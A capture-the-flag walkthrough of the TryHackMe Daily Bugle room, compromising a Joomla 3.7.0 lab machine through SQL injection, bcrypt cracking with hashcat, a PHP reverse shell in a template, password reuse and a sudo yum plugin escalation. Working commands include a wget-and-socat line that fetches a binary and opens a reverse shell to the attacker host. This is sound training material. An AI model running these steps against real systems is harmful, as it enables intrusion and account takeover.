# Daily Bugle

## Introduction

Welcome to my another writeup! In this TryHackMe [Daily Bugle](https://tryhackme.com/room/dailybugle) room, you'll learn: Joomla enumeration, SQL injection, hash cracking, abusing `yum` and more! Without further ado, let's dive in.

## Background

> Compromise a Joomla CMS account via SQLi, practise cracking hashes and escalate your privileges by taking advantage of yum.

> Difficulty: Hard

- Overall difficulty for me: Easy
   - Initial foothold: Easy
   - Privilege escalation: Easy

## Service Enumeration

As usual, scan the machine for open ports via `rustscan`!

**Rustscan:**
```
┌──(root🌸siunam)-[~/ctf/thm/ctf/Daily-Bugle]
└─# export RHOSTS=10.10.47.144
                                                                                                           
┌──(root🌸siunam)-[~/ctf/thm/ctf/Daily-Bugle]
└─# rustscan --ulimit 5000 -t 2000 --range=1-65535 $RHOSTS -- -sC -sV -oN rustscan/rustscan.txt
[...]
PORT     STATE SERVICE REASON         VERSION
22/tcp   open  ssh     syn-ack ttl 63 OpenSSH 7.4 (protocol 2.0)
| ssh-hostkey: 
|   2048 68ed7b197fed14e618986dc58830aae9 (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQCbp89KqmXj7Xx84uhisjiT7pGPYepXVTr4MnPu1P4fnlWzevm6BjeQgDBnoRVhddsjHhI1k+xdnahjcv6kykfT3mSeljfy+jRc+2ejMB95oK2AGycavgOfF4FLPYtd5J97WqRmu2ZC2sQUvbGMUsrNaKLAVdWRIqO5OO07WIGtr3c2ZsM417TTcTsSh1Cjhx3F+gbgi0BbBAN3sQqySa91AFruPA+m0R9JnDX5rzXmhWwzAM1Y8R72c4XKXRXdQT9szyyEiEwaXyT0p6XiaaDyxT2WMXTZEBSUKOHUQiUhX7JjBaeVvuX4ITG+W8zpZ6uXUrUySytuzMXlPyfMBy8B
|   256 5cd682dab219e33799fb96820870ee9d (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBKb+wNoVp40Na4/Ycep7p++QQiOmDvP550H86ivDdM/7XF9mqOfdhWK0rrvkwq9EDZqibDZr3vL8MtwuMVV5Src=
|   256 d2a975cf2f1ef5444f0b13c20fd737cc (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIP4TcvlwCGpiawPyNCkuXTK5CCpat+Bv8LycyNdiTJHX
80/tcp   open  http    syn-ack ttl 63 Apache httpd 2.4.6 ((CentOS) PHP/5.6.40)
| http-robots.txt: 15 disallowed entries 
| /joomla/administrator/ /administrator/ /bin/ /cache/ 
| /cli/ /components/ /includes/ /installation/ /language/ 
|_/layouts/ /libraries/ /logs/ /modules/ /plugins/ /tmp/
3306/tcp open  mysql   syn-ack ttl 63 MariaDB (unauthorized)
```

According to `rustscan` result, we have 3 ports are opened:

Open Ports        | Service
------------------|------------------------
22                | OpenSSH 7.4
80                | Apache 2.4.6 ((CentOS) PHP/5.6.40
3306              | MariaDB

### HTTP on Port 80

**Adding a new domain to `/etc/hosts`:** (Optional, but it's a good practice to do so.)
```
┌──(root🌸siunam)-[~/ctf/thm/ctf/Daily-Bugle]
└─# echo "$RHOSTS daily-bugle.thm" | tee -a /etc/hosts
```

**robots.txt:**
```
┌──(root🌸siunam)-[~/ctf/thm/ctf/Daily-Bugle]
└─# curl http://daily-bugle.thm/robots.txt
# If the Joomla site is installed within a folder 
# eg www.example.com/joomla/ then the robots.txt file 
# MUST be moved to the site root 
# eg www.example.com/robots.txt
# AND the joomla folder name MUST be prefixed to all of the
# paths. 
# eg the Disallow rule for the /administrator/ folder MUST 
# be changed to read 
# Disallow: /joomla/administrator/
#
# For more information about the robots.txt standard, see:
# http://www.robotstxt.org/orig.html
#
# For syntax checking, see:
# http://tool.motoricerca.info/robots-checker.phtml

User-agent: *
Disallow: /administrator/
Disallow: /bin/
Disallow: /cache/
Disallow: /cli/
Disallow: /components/
Disallow: /includes/
Disallow: /installation/
Disallow: /language/
Disallow: /layouts/
Disallow: /libraries/
Disallow: /logs/
Disallow: /modules/
Disallow: /plugins/
Disallow: /tmp/
```

**Home page:**

![](https://github.com/siunam321/CTF-Writeups/blob/main/TryHackMe/Daily-Bugle/images/a1.png)

**Found `Joomla` CMS (Content Management System)!**

Let's find it's **version**!

**To do so, I'll use `joomscan`: (`joomscan` is like `wpscan` in WordPress.)**
```
┌──(root🌸siunam)-[~/ctf/thm/ctf/Daily-Bugle]
└─# joomscan -u http://daily-bugle.thm/
[...]
[+] FireWall Detector
[++] Firewall not detected

[+] Detecting Joomla Version
[++] Joomla 3.7.0

[+] Core Joomla Vulnerability
[++] Target Joomla core is not vulnerable

[+] Checking Directory Listing
[++] directory has directory listing : 
http://daily-bugle.thm/administrator/components
http://daily-bugle.thm/administrator/modules
http://daily-bugle.thm/administrator/templates
http://daily-bugle.thm/images/banners

[+] Checking apache info/status files
[++] Readable info/status files are not found

[+] admin finder
[++] Admin page : http://daily-bugle.thm/administrator/

[+] Checking robots.txt existing
[++] robots.txt is found
path : http://daily-bugle.thm/robots.txt 

Interesting path found from robots.txt
http://daily-bugle.thm/joomla/administrator/
http://daily-bugle.thm/administrator/
http://daily-bugle.thm/bin/
http://daily-bugle.thm/cache/
http://daily-bugle.thm/cli/
http://daily-bugle.thm/components/
http://daily-bugle.thm/includes/
http://daily-bugle.thm/installation/
http://daily-bugle.thm/language/
http://daily-bugle.thm/layouts/
http://daily-bugle.thm/libraries/
http://daily-bugle.thm/logs/
http://daily-bugle.thm/modules/
http://daily-bugle.thm/plugins/
http://daily-bugle.thm/tmp/

[+] Finding common backup files name
[++] Backup files are not found

[+] Finding common log files name
[++] error log is not found

[+] Checking sensitive config.php.x file
[++] Readable config files are not found
[...]
```

- Joomla version: 3.7.0

**It says this version not vulnerable, let me google it to confirm it:**

![](https://github.com/siunam321/CTF-Writeups/blob/main/TryHackMe/Daily-Bugle/images/a2.png)

**Hmm... SQL injection in `com_fields`?**

- Exploit-DB: [Joomla! 3.7.0 - 'com_fields' SQL Injection](https://www.exploit-db.com/exploits/42033)

![](https://github.com/siunam321/CTF-Writeups/blob/main/TryHackMe/Daily-Bugle/images/a3.png)

**Why it's using `sqlmap`? Let's do this via a python script!**

> Note: I tried to write a python script to do this, but it's way harder than I thought :(

**After poking around in google, I found [a GitHub repository](https://github.com/XiphosResearch/exploits/blob/44bf14da73220467410c2d952c33638281c47954/Joomblah/joomblah.py) that holds lots of exploit, including Joomla 3.7.0 SQL injection.**

I've read through the exploit, and it looks great! Let's `wget` that exploit!

```
┌──(root🌸siunam)-[~/ctf/thm/ctf/Daily-Bugle]
└─# wget https://raw.githubusercontent.com/XiphosResearch/exploits/44bf14da73220467410c2d952c33638281c47954/Joomblah/joomblah.py
```

**Let's run that exploit!**
```
┌──(root🌸siunam)-[~/ctf/thm/ctf/Daily-Bugle]
└─# python2 joomblah.py http://daily-bugle.thm
                                                                                                                    
    .---.    .-'''-.        .-'''-.                                                           
    |   |   '   _    \     '   _    \                            .---.                        
    '---' /   /` '.   \  /   /` '.   \  __  __   ___   /|        |   |            .           
    .---..   |     \  ' .   |     \  ' |  |/  `.'   `. ||        |   |          .'|           
    |   ||   '      |  '|   '      |  '|   .-.  .-.   '||        |   |         <  |           
    |   |\    \     / / \    \     / / |  |  |  |  |  |||  __    |   |    __    | |           
    |   | `.   ` ..' /   `.   ` ..' /  |  |  |  |  |  |||/'__ '. |   | .:--.'.  | | .'''-.    
    |   |    '-...-'`       '-...-'`   |  |  |  |  |  ||:/`  '. '|   |/ |   \ | | |/.'''. \   
    |   |                              |  |  |  |  |  |||     | ||   |`" __ | | |  /    | |   
    |   |                              |__|  |__|  |__|||\    / '|   | .'.''| | | |     | |   
 __.'   '                                              |/'..' / '---'/ /   | |_| |     | |   
|      '                                               '  `'-'`       \ \._,\ '/| '.    | '.  
|____.'                                                                `--'  `" '---'   '---' 

 [-] Fetching CSRF token
 [-] Testing SQLi
  -  Found table: fb9j5_users
  -  Extracting users from fb9j5_users
 [$] Found user ['811', 'Super User', 'jonah', 'jonah@tryhackme.com', '$2y$10$0veO/{Redacted}', '', '']
  -  Extracting sessions from fb9j5_session
```

- Joomla username: jonah

**We can see that this hash algorithm is blowfish via `hashid`:** 
```
┌──(root🌸siunam)-[~/ctf/thm/ctf/Daily-Bugle]
└─# hashid -m jonah.hash 
--File 'jonah.hash'--
Analyzing '$2y$10$0veO/{Redacted}'
[+] Blowfish(OpenBSD) [Hashcat Mode: 3200]
[+] Woltlab Burning Board 4.x 
[+] bcrypt [Hashcat Mode: 3200]
--End of file 'jonah.hash'--
```

Since cracking blowfish hash could take a long time, I'll copy and paste that hash into my Windows host machine, and **use `hashcat` to crack it with my GPU**.

```
E:\hashcat-6.2.6>.\hashcat.exe jonah.hash -w 3 -a 0 -m 3200 .\wordlist\rockyou.txt
[...]
$2y$10$0veO/{Redacted}:{Redacted}

Session..........: hashcat
Status...........: Cracked
Hash.Mode........: 3200 (bcrypt $2*$, Blowfish (Unix))
Hash.Target......: $2y$10$0veO/{Redacted}
Time.Started.....: Tue Oct 18 22:04:11 2022 (2 mins, 29 secs)
Time.Estimated...: Tue Oct 18 22:06:40 2022 (0 secs)
Kernel.Feature...: Pure Kernel
Guess.Base.......: File (.\wordlist\rockyou.txt)
Guess.Queue......: 1/1 (100.00%)
Speed.#1.........:      315 H/s (86.08ms) @ Accel:2 Loops:128 Thr:11 Vec:1
Recovered........: 1/1 (100.00%) Digests (total), 1/1 (100.00%) Digests (new)
Progress.........: {Redacted}/14344385 (0.33%)
Rejected.........: 0/{Redacted} (0.00%)
Restore.Point....: {Redacted}/14344385 (0.33%)
Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:896-1024
Candidate.Engine.: Device Generator
Candidates.#1....: {Redacted} -> {Redacted}
Hardware.Mon.#1..: Temp: 64c Fan: 45% Util:100% Core:1880MHz Mem:3802MHz Bus:16

Started: Tue Oct 18 22:03:49 2022
Stopped: Tue Oct 18 22:06:41 2022
```

Cracked in 2 mins and 29 seconds with my GTX 1060 6GB GPU!

**Armed with the above information, we can try to login as jonah in administrator panel! (`/administrator/`)**

![](https://github.com/siunam321/CTF-Writeups/blob/main/TryHackMe/Daily-Bugle/images/a4.png)

![](https://github.com/siunam321/CTF-Writeups/blob/main/TryHackMe/Daily-Bugle/images/a5.png)

I'm in! Next, we need to get a shell in the target machine!

## Initial Foothold

**To get a shell in the target machine, I'll:**

- Go to "Extensions" -> "Templates" -> "Templates":

![](https://github.com/siunam321/CTF-Writeups/blob/main/TryHackMe/Daily-Bugle/images/a6.png)

- Choose one of those templates:

![](https://github.com/siunam321/CTF-Writeups/blob/main/TryHackMe/Daily-Bugle/images/a7.png)

- Choose `index.php`, modify it to a PHP reverse shell, and click "Save":

![](https://github.com/siunam321/CTF-Writeups/blob/main/TryHackMe/Daily-Bugle/images/a8.png)

- Setup a `nc` listener:

```
┌──(root🌸siunam)-[~/ctf/thm/ctf/Daily-Bugle]
└─# nc -lnvp 443
listening on [any] 443 ...
```

- Trigger the reverse shell via clicking the "Template Preview" button:

![](https://github.com/siunam321/CTF-Writeups/blob/main/TryHackMe/Daily-Bugle/images/a9.png)

```
┌──(root🌸siunam)-[~/ctf/thm/ctf/Daily-Bugle]
└─# nc -lnvp 443
listening on [any] 443 ...
connect to [10.9.0.253] from (UNKNOWN) [10.10.47.144] 48736
Linux dailybugle 3.10.0-1062.el7.x86_64 #1 SMP Wed Aug 7 18:08:02 UTC 2019 x86_64 x86_64 x86_64 GNU/Linux
 10:16:38 up 28 min,  0 users,  load average: 0.07, 0.08, 0.10
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
uid=48(apache) gid=48(apache) groups=48(apache)
bash: no job control in this shell
bash-4.2$ ip a
ip a
1: lo: <LOOPBACK,UP,LOWER_UP> mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000
    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
    inet 127.0.0.1/8 scope host lo
       valid_lft forever preferred_lft forever
    inet6 ::1/128 scope host 
       valid_lft forever preferred_lft forever
2: eth0: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 9001 qdisc pfifo_fast state UP group default qlen 1000
    link/ether 02:f6:d8:0b:49:2f brd ff:ff:ff:ff:ff:ff
    inet 10.10.47.144/16 brd 10.10.255.255 scope global dynamic eth0
       valid_lft 3540sec preferred_lft 3540sec
    inet6 fe80::f6:d8ff:fe0b:492f/64 scope link 
       valid_lft forever preferred_lft forever
```

I'm user `apache`!

**Stable shell via `socat`:**
```
bash-4.2$ wget http://10.9.0.253/socat -O /tmp/socat;chmod +x /tmp/socat;/tmp/socat TCP:10.9.0.253:4444 EXEC:'/bin/bash',pty,stderr,setsid,sigint,sane

┌──(root🌸siunam)-[~/ctf/thm/ctf/Daily-Bugle]
└─# socat -d -d file:`tty`,raw,echo=0 TCP-LISTEN:4444
2022/10/18 10:18:23 socat[50374] N opening character device "/dev/pts/2" for reading and writing
2022/10/18 10:18:23 socat[50374] N listening on AF=2 0.0.0.0:4444
                                                                 2022/10/18 10:18:26 socat[50374] N accepting connection from AF=2 10.10.47.144:59328 on AF=2 10.9.0.253:4444
                                                                  2022/10/18 10:18:26 socat[50374] N starting data transfer loop with FDs [5,5] and [7,7]
                                              bash-4.2$ 
bash-4.2$ stty rows 22 columns 107
bash-4.2$ export TERM=xterm-256color
bash-4.2$ ^C
bash-4.2$ 
```

## Privilege Escalation

### apache to jjameson

```
bash-4.2$ cat /etc/passwd | grep /bin/bash
root:x:0:0:root:/root:/bin/bash
jjameson:x:1000:1000:Jonah Jameson:/home/jjameson:/bin/bash
```

- Found 1 user: `jjameson`

**In `/var/www/html/configuration.php `, I found a hardcoded MySQL credentials:**
```
bash-4.2$ cat /var/www/html/configuration.php 
[...]
	public $dbtype = 'mysqli';
	public $host = 'localhost';
	public $user = 'root';
	public $password = '{Redacted}';
[...]
```

**Maybe the user `jjameson` has reused this password? Let's try:**
```
bash-4.2$ su jjameson
Password: 
[jjameson@dailybugle /]$ whoami;id
jjameson
uid=1000(jjameson) gid=1000(jjameson) groups=1000(jjameson)
```

Oh! I'm user `jjameson`!

**user.txt:**
```
[jjameson@dailybugle ~]$ cat /home/jjameson/user.txt 
{Redacted}
```

### jjameson to root

**Sudo permission:**
```
[jjameson@dailybugle ~]$ sudo -l
Matching Defaults entries for jjameson on dailybugle:
    !visiblepw, always_set_home, match_group_by_gid, always_query_group_plugin, env_reset,
    env_keep="COLORS DISPLAY HOSTNAME HISTSIZE KDEDIR LS_COLORS", env_keep+="MAIL PS1 PS2 QTDIR USERNAME
    LANG LC_ADDRESS LC_CTYPE", env_keep+="LC_COLLATE LC_IDENTIFICATION LC_MEASUREMENT LC_MESSAGES",
    env_keep+="LC_MONETARY LC_NAME LC_NUMERIC LC_PAPER LC_TELEPHONE", env_keep+="LC_TIME LC_ALL LANGUAGE
    LINGUAS _XKB_CHARSET XAUTHORITY", secure_path=/sbin\:/bin\:/usr/sbin\:/usr/bin

User jjameson may run the following commands on dailybugle:
    (ALL) NOPASSWD: /usr/bin/yum
```

**User `jjameson` can run `/usr/bin/yum` without password!**

**According to [GTFOBins](https://gtfobins.github.io/gtfobins/yum/#sudo), we can escalate to root!**

![](https://github.com/siunam321/CTF-Writeups/blob/main/TryHackMe/Daily-Bugle/images/a10.png)

Let's copy and paste that to the target machine!

```
[jjameson@dailybugle ~]$ TF=$(mktemp -d)
[jjameson@dailybugle ~]$ cat >$TF/x<<EOF
> [main]
> plugins=1
> pluginpath=$TF
> pluginconfpath=$TF
> EOF
[jjameson@dailybugle ~]$ 
[jjameson@dailybugle ~]$ cat >$TF/y.conf<<EOF
> [main]
> enabled=1
> EOF
[jjameson@dailybugle ~]$ 
[jjameson@dailybugle ~]$ cat >$TF/y.py<<EOF
> import os
> import yum
> from yum.plugins import PluginYumExit, TYPE_CORE, TYPE_INTERACTIVE
> requires_api_version='2.1'
> def init_hook(conduit):
>   os.execl('/bin/sh','/bin/sh')
> EOF
[jjameson@dailybugle ~]$ sudo yum -c $TF/x --enableplugin=y
Loaded plugins: y
No plugin match for: y

sh-4.2# whoami;hostname;id;ip a
root
dailybugle
uid=0(root) gid=0(root) groups=0(root)
[...]
2: eth0: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 9001 qdisc pfifo_fast state UP group default qlen 1000
    link/ether 02:f6:d8:0b:49:2f brd ff:ff:ff:ff:ff:ff
    inet 10.10.47.144/16 brd 10.10.255.255 scope global dynamic eth0
       valid_lft 2850sec preferred_lft 2850sec
    inet6 fe80::f6:d8ff:fe0b:492f/64 scope link 
       valid_lft forever preferred_lft forever
```

I'm root! :D

## Rooted

**root.txt:**
```
sh-4.2# cat /root/root.txt
{Redacted}
```

# Conclusion

What we've learned:

1. Joomla Enumeration
2. Exploiting SQL Injection in Joomla Version 3.7.0
3. Hash Cracking via `hashcat` With GPU
4. Horizontal Privilege Escalation via Password Reuse
5. Vertical Privilege Escalation via Misconfigured Sudo Permission in `yum`